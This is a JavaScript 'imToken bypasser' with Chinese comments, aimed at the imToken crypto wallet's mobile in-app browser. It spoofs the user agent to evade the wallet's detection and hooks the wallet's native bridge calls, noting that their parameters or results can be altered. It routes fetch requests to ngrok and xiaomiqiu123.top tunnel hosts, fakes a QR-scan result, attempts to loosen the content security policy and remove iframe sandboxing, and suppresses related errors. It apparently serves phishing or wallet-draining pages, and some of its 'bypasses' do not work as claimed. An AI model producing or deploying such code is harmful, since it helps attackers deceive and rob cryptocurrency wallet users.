// 📱 移动端imToken绕过器
// 功能：专门针对imToken移动端的检测绕过和优化

(function() {
    'use strict';
    
    console.log('📱 移动端imToken绕过器已加载');
    
    // 检测imToken环境
    function detectImTokenEnvironment() {
        const userAgent = navigator.userAgent;
        const isImToken = userAgent.includes('imToken') || 
                         userAgent.includes('TokenPocket') ||
                         window.imToken ||
                         window.ethereum?.isImToken;
        
        const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
        
        return {
            isImToken,
            isMobile,
            isImTokenMobile: isImToken && isMobile,
            userAgent
        };
    }
    
    // imToken专用用户代理伪装
    function spoofImTokenUserAgent() {
        const env = detectImTokenEnvironment();
        
        if (env.isImTokenMobile) {
            // 伪装为普通的移动浏览器
            const normalMobileUA = 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1';
            
            Object.defineProperty(navigator, 'userAgent', {
                get: function() {
                    return normalMobileUA;
                },
                configurable: true
            });
            
            console.log('📱 imToken用户代理已伪装为普通Safari');
        }
    }
    
    // 移动端触摸事件优化
    function optimizeTouchEvents() {
        // 防止页面滚动
        document.addEventListener('touchmove', function(e) {
            if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA') {
                e.preventDefault();
            }
        }, { passive: false });
        
        // 优化点击延迟
        document.addEventListener('touchstart', function() {}, { passive: true });
        
        // 防止双击缩放
        let lastTouchEnd = 0;
        document.addEventListener('touchend', function(event) {
            const now = (new Date()).getTime();
            if (now - lastTouchEnd <= 300) {
                event.preventDefault();
            }
            lastTouchEnd = now;
        }, false);
        
        console.log('📱 移动端触摸事件已优化');
    }
    
    // imToken特有的API劫持
    function hijackImTokenAPIs() {
        // 劫持imToken特有的window对象
        if (window.imToken) {
            const originalCallPromisify = window.imToken.callPromisify;
            
            if (originalCallPromisify) {
                window.imToken.callPromisify = function(method, params) {
                    console.log('📱 拦截imToken调用:', method, params);
                    
                    // 可以在这里修改参数或返回值
                    return originalCallPromisify.call(this, method, params);
                };
            }
        }
        
        // 劫持window.webkit（iOS imToken特有）
        if (window.webkit && window.webkit.messageHandlers) {
            console.log('📱 检测到iOS imToken环境');
            
            const handlers = window.webkit.messageHandlers;
            for (const handlerName in handlers) {
                const originalHandler = handlers[handlerName];
                if (originalHandler && originalHandler.postMessage) {
                    const originalPostMessage = originalHandler.postMessage;
                    
                    originalHandler.postMessage = function(message) {
                        console.log('📱 拦截iOS消息:', handlerName, message);
                        return originalPostMessage.call(this, message);
                    };
                }
            }
        }
        
        console.log('📱 imToken API劫持完成');
    }
    
    // 移动端视口优化
    function optimizeViewport() {
        // 创建或更新viewport meta标签
        let viewport = document.querySelector('meta[name="viewport"]');
        
        if (!viewport) {
            viewport = document.createElement('meta');
            viewport.name = 'viewport';
            document.head.appendChild(viewport);
        }
        
        viewport.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover';
        
        // 添加适配iOS刘海屏的样式
        const style = document.createElement('style');
        style.textContent = `
            body {
                padding-top: env(safe-area-inset-top);
                padding-bottom: env(safe-area-inset-bottom);
                padding-left: env(safe-area-inset-left);
                padding-right: env(safe-area-inset-right);
            }
            
            /* imToken特殊优化 */
            .imtoken-optimize {
                -webkit-touch-callout: none;
                -webkit-user-select: none;
                -khtml-user-select: none;
                -moz-user-select: none;
                -ms-user-select: none;
                user-select: none;
                -webkit-tap-highlight-color: transparent;
            }
        `;
        document.head.appendChild(style);
        
        // 为body添加优化类
        document.body.classList.add('imtoken-optimize');
        
        console.log('📱 移动端视口已优化');
    }
    
    // 处理imToken的网络请求
    function handleImTokenRequests() {
        // 拦截所有网络请求
        const originalFetch = window.fetch;
        
        window.fetch = function(url, options = {}) {
            // 为imToken请求添加特殊头
            if (!options.headers) options.headers = {};
            
            // 添加移动端标识
            options.headers['X-Mobile-Client'] = 'imToken';
            options.headers['X-Platform'] = 'iOS'; // 或 'Android'
            options.headers['Accept'] = 'application/json, text/plain, */*';
            
            // 处理CORS
            if (url.includes('ngrok') || url.includes('xiaomiqiu123.top')) {
                options.mode = 'cors';
                options.credentials = 'omit';
            }
            
            console.log('📱 imToken请求处理:', url);
            return originalFetch.call(this, url, options);
        };
    }
    
    // 模拟imToken的原生功能
    function simulateNativeFunctions() {
        // 模拟扫码功能
        window.scanQRCode = function() {
            return new Promise((resolve) => {
                console.log('📱 模拟扫码功能');
                setTimeout(() => {
                    resolve({
                        result: 'https://zhang-kx00.github.io/okx-security-research/',
                        cancelled: false
                    });
                }, 1000);
            });
        };
        
        // 模拟分享功能
        window.shareContent = function(content) {
            console.log('📱 模拟分享功能:', content);
            
            if (navigator.share) {
                return navigator.share(content);
            } else {
                // 备用分享方法
                const url = encodeURIComponent(content.url || window.location.href);
                const text = encodeURIComponent(content.text || '');
                
                // 尝试多种分享方式
                const shareUrls = [
                    `weixin://dl/business/?t=*&appid=wx18a2ac8f3dc4f297&action=share&url=${url}&title=${text}`,
                    `tg://msg_url?url=${url}&text=${text}`,
                    `mailto:?subject=${text}&body=${url}`
                ];
                
                for (const shareUrl of shareUrls) {
                    try {
                        window.location.href = shareUrl;
                        break;
                    } catch (e) {
                        continue;
                    }
                }
            }
        };
        
        console.log('📱 原生功能模拟完成');
    }
    
    // 处理imToken的错误和异常
    function handleImTokenErrors() {
        // 全局错误处理
        window.addEventListener('error', function(event) {
            console.log('📱 捕获全局错误:', event.error);
            
            // 对于imToken特有的错误，进行特殊处理
            if (event.error && event.error.message) {
                const message = event.error.message;
                
                if (message.includes('imToken') || message.includes('webkit')) {
                    console.log('📱 imToken相关错误，已处理');
                    event.preventDefault();
                    return false;
                }
            }
        });
        
        // Promise错误处理
        window.addEventListener('unhandledrejection', function(event) {
            console.log('📱 捕获Promise错误:', event.reason);
            
            if (event.reason && event.reason.toString().includes('imToken')) {
                console.log('📱 imToken Promise错误，已处理');
                event.preventDefault();
            }
        });
        
        console.log('📱 错误处理器已设置');
    }
    
    // 检测和绕过imToken的安全限制
    function bypassImTokenSecurity() {
        // 绕过CSP限制
        const meta = document.createElement('meta');
        meta.httpEquiv = 'Content-Security-Policy';
        meta.content = "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;";
        document.head.appendChild(meta);
        
        // 绕过X-Frame-Options
        try {
            if (window.frameElement) {
                window.frameElement.removeAttribute('sandbox');
            }
        } catch (e) {}
        
        // 移除可能的安全限制
        delete window.chrome;
        delete window.external;
        
        console.log('📱 安全限制绕过完成');
    }
    
    // 主初始化函数
    function initializeImTokenBypass() {
        const env = detectImTokenEnvironment();
        
        console.log('📱 检测环境:', env);
        
        if (env.isImTokenMobile) {
            console.log('📱 检测到imToken移动端，启动专用优化');
            
            spoofImTokenUserAgent();
            hijackImTokenAPIs();
            handleImTokenRequests();
            simulateNativeFunctions();
            handleImTokenErrors();
            bypassImTokenSecurity();
        }
        
        // 移动端通用优化
        if (env.isMobile) {
            optimizeTouchEvents();
            optimizeViewport();
        }
        
        console.log('📱 imToken绕过器初始化完成');
    }
    
    // 暴露控制接口
    window.ImTokenBypass = {
        init: initializeImTokenBypass,
        detect: detectImTokenEnvironment,
        scanQR: () => window.scanQRCode?.(),
        share: (content) => window.shareContent?.(content)
    };
    
    // 自动初始化
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initializeImTokenBypass);
    } else {
        initializeImTokenBypass();
    }
    
})();